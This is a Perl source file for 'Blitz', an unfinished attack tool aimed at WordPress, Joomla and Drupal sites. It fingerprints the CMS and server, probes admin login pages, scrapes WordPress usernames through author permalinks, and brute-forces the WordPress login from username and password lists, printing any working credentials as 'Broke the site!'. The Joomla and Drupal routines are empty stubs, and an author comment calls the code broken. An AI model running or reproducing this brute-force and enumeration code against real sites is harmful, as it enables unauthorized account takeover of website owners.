#!/usr/bin/perl

#-- Multi-CMS vulnerability scanner
#-- Modules
use strict;
use warnings;
use LWP::UserAgent ();
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Cookies;
use LWP::Protocol::https;
use Term::ANSIColor;
use Getopt::Long;
#-- Turns off warnings for uninitialized values
no warnings 'uninitialized';
#-----------------------
system('clear');
#-----------------------
#-- Banner
my $banner = << 'EOB';
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
    __    ___ __
   / /_  / (_) /_____
  / __ \/ / / __/_  /
 / /_/ / / / /_  / /_
/_.___/_/_/\__/ /___/

+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
EOB

#-----------------------
#-- Global variables
my ($help, $cms, $guess, $brute, $plugins, $target, $user, $server, $ulist, $plist, $admin);
#-- Options to be used in the command line and their associated variables
#-- *=s sets the variable as a string
GetOptions(
  "h|help"        =>  \$help,
  "c|cms=s"       =>  \$cms,
  "g|guess"       =>  \$guess,
  "b|brute"       =>  \$brute,
  "p|plugins"     =>  \$plugins,
  "t|target=s"    =>  \$target,
  "u|user"        =>  \$user,
  "s|server"      =>  \$server,
  "ul|ulist=s"    =>  \$ulist,
  "pl|plist=s"    =>  \$plist,
  "a|admin"       =>  \$admin,
);

#-- Bot building for things
my $cookie = new HTTP::Cookies(ignore_discard => 1);
my $bot = LWP::UserAgent->new(keep_alive => 1);
$bot -> timeout(10);
$bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
$bot -> cookie_jar($cookie);

#-----------------------
#-- Manipulating the inputted url to add HTTP if it is not present and remove a trailing slash
if ($target !~ /http:\/\//) {$target = "http://$target";}
$target = $1 if($target =~/(.*)\/$/);
#-----------------------
#-- Required variable checking
if ($help ne ''){
  help();
  print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
  print color('bright_magenta'), "[*] View changelog? (y/n): ";
  chomp(my $chng = <STDIN>);
  if ($chng =~ /y/i){
    changelog();
    print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
    print color('magenta'),"[*] Press ENTER to quit...";
    print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
    <STDIN>;
    exit(0);
  }
  else {
    print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
    print color('magenta'),"[*] Press ENTER to quit...";
    print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
    <STDIN>;
    exit(0);
  }
}

#-- Currently debugging, broken af.. somehow, I'm not too sure
if ($brute){
  if($ulist eq '' || $plist eq ''){
    help();
    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
    print color('bright_red'),"[*] Provide a list of usernames and passwords\n";
    print color('magenta'),"[*] Press ENTER to quit...";
    print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
    <STDIN>;
    exit(0);
  }
}

if ($target eq ''){
  help();
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
  print color('bright_red'),"[*] Provide a target\n";
  print color('magenta'),"[*] Press ENTER to quit...";
  print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
  <STDIN>;
  exit(0);
}

if (($cms eq '') && ($guess eq '')){
  help();
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
  print color('bright_red'),"[*] Provide a CMS or select the guess option\n";
  print color('magenta'),"[*] Press ENTER to quit...";
  print color('bold yellow'), "\n+++++++++++++++++++++++++++++++++\n";
  <STDIN>;
  exit(0);
}
#-- END of variable check
#-----------------------
#-- Running stuff
if ($server){
  server_find();
}
if (($user) && ($cms =~ /wordpress/i)){
  wp_user();
} elsif (($user) && ($cms !~ /wordpress/i)){
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
  print color('bold red'), "[*] Incompatible CMS\n", color('reset');
  print color('bold red'), "[*] Skipping user scraping\n", color('reset');
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
}

#-----------------------
#-- Changelog
sub changelog {
print q(

+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
CURRENT VERSION: 0.0.6

Changes made:

Version 0.0.6 -
Added WordPress brute forcing, minor bug fixes, removed the bundling configuration,
began intitial testing

Version 0.0.5 -
Bug fixes

Version 0.0.4 -
Bug fixes and additional minor features added

Version 0.0.3 -
Added the functionality for CMS finger printing and admin page finding

Version 0.0.2 -
Basic functionality added

Version 0.0.1 -
Basic structure and design
+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
);

}

#-- Building the help menu
sub help {
  print color('bright_white');
  print $banner;
  print color('bright_cyan');
  print q(
  Usage: perl Blitz.pl [options] <arguments>

  Example:

  perl Blitz.pl -c wordpress -b -p -u -t target.com -ul users.txt -pl list.txt

  perl Blitz.pl -cms joomla -brute -ulist users.txt -pl pass.txt

  IMPORTANT: Only supported CMS' are: WordPress, Joomla!, and Drupal. More to come.

  OPTIONS:

  h|help      =>  Help menu
  a|admin     =>  Admin page finding
  c|cms       =>  Tells the CMS that is being targeted (reuired if -g is not being used)
  g|guess     =>  Attempts to guess target CMS
  b|brute     =>  Attempts to find an brute force the login page
  p|plugins   =>  Attempts to find the plugins in use
  t|target    =>  Provides the target to scan (required)
  u|user      =>  Attempts to scrape a username (Only compatible with WordPress)
  s|server    =>  Attempts to find the server daemon
  ul|ulist    =>  Provide a list of usernames (required if -b is in use)
  pl|plist    =>  Provide a list of passwords (required if -b is in use)
  ex|exploit  =>  Attempt to reach exploit-db and gather a list of exploits (I'll get around to this at somepoint)

);
  print color('reset');
}

#-- subroutine building
sub cms_hunt {
  #-- Runs a GET request to get the page content for filtering
  my $cms = $bot->get($target)->content;
  if ($cms =~ m/wp-content|wordpress/ig){
    print color('bright_yellow'), "[*] CMS is found to be WordPress\n";
    $cms = 'wordpress';
  }
  elsif ($cms =~ m/joomla!/ig){
    print color('bright_yellow'), "[*] CMS is found to be Joomla\n";
    $cms = 'joomla';
  }
  elsif ($cms =~ m/drupal/gi){
    print color('bright_yellow'), "[*] CMS is found to be Drupal\n";
    $cms = 'drupal';
  }
  else{
    print color('bold red'), "[*] Unable to determine CMS\n";
    print color('magenta'), "[*] Press ENTER to quit...";
    <STDIN>;
    exit(0);
  }
}

#-- Hunts for the server daemon (Apache, Nginx, etc)
sub server_find {
  my $sock = IO::Socket::INET->new(PeerAddr => $target, PeerPort => 80, Proto => 'tcp', Timeout => 1);
  if ($sock){
    $sock->print("HEAD / HTTP/1.1\n\n\n\n");
    while(<$sock>){
      my $server = $_;
      if($_ =~ m/^server:(.*?)/ig){
        print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
        print color('bold green'), "[*]$_\n";
        print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
      }
    }
  }
}

#-- Server status code finding
sub status_code {
  my $code = $bot->get($target);
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
  print color('bold green'), "[*] Server status ", $code->status_line, "\n", color('reset');
  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
}

#-- Brute forcing subroutines
sub admin_find {
  #-- Default admin pages
  my $wp_admin = "/wp-login.php";
  my $joomla_admin = "/admininstrator/index.php";
  my $drupal_admin = "/user/login";

  my $admin;
  if ($cms =~ /wordpress/gi){
    $admin = $bot->get($target.$wp_admin);
    if ($bot->is_success){
      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
      return $admin;
    }
    else {
      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
      }
    }
  elsif($cms =~ /joomla|joomla!/gi) {
    $admin = $bot->get($target.$joomla_admin);
    if ($bot->is_success){
      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
      return $admin;
    }
    else {
      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
      }
    }
  elsif($cms =~ /drupal/gi) {
    $admin = $bot->get($target.$drupal_admin);
    if ($bot->is_success){
      print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
      return $admin;
    }
    else {
      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
    }
  }
}

#-- Scrapes the username from the author permalink (WordPress only)
sub wp_user {
  $user = $target."/?author=1";
  my $req = HTTP::Request ->new(GET=>$user);
  my $userhunt = $bot->request($req)->content;
  if($userhunt =~/author\/(.*?)\//){
    my $victim = $1;
    print $victim;
    if ($brute){
      wp_brute($victim);
    }
  }
}

#-- Narrowed brute forcing subroutines
sub wp_brute {
  #-- Optional test to see if the admin page is accessible
  if ($admin){
    admin_find();
  }
  my $victim = shift;
  if ($victim){
    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
    print color('bright_cyan'), "[*] Using user $victim\n";
    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";

    open my $pass_handle, '<', $plist;
    chomp(my @pass = <$pass_handle>);
    close $pass_handle;

    foreach (@pass) {
        chomp(my $passwd = $_);
          my $host = $target . '/wp-login.php';
          my $auth = $target . '/wp-admin/';
          my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
          my $attempt = $bot->request($login);
          my $status = $attempt-> as_string;
          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
            print "[*]Broke the site!\n";
            print "[*] =>\t$victim \n";
            print "[*] =>\t$passwd \n";
            print color('reset');
          }
        }
      }
  if ($user eq ''){
    open my $user_handle, '<', $ulist;
    chomp(my @users = <$user_handle>);
    close $user_handle;
    open my $pass_handle, '<', $plist;
    chomp(my @pass = <$pass_handle>);
    close $pass_handle;

    foreach (@users) {
      chomp(my $users = $_);
        foreach (@pass) {
          chomp(my $passwd = $_);
          my $host = $target . '/wp-login.php';
          my $auth = $target . '/wp-admin/';
          my $login = POST $target,[log => $users, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
          my $attempt = $bot->request($login);
          my $status = $attempt-> as_string;
          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
            print "[*]Broke the site!\n";
            print "[*] =>\t$users \n";
            print "[*] =>\t$passwd \n";
            print color('reset');
        }
      }
    }
  }
}

sub joomla_brute {}

sub drupal_brute {}

#-- END brute force subroutines

#-- Plugin enumeration subroutines

#-- END plugin enumeration subroutines
